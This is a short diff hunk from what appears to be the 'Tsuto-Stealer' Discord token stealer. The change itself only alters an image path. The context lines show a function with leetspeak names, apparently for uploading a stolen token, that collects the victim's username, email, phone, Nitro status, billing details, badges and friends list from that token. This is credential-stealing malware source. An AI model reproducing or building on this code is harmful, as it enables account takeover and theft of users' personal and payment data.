@@ -409,7 +409,7 @@ def UP104D70K3N(token, path):
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://github.com/eoxd/Tsuto-Stealer/blob/main/tsuto.png"
+    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://github.com/eoxd/Tsuto-Stealer/blob/main/img/tsuto.png"
     billing = G3781111N6(token)
     badge = G3784D63(flags)
     friends = Tr1M(G37UHQFr13ND5(token))
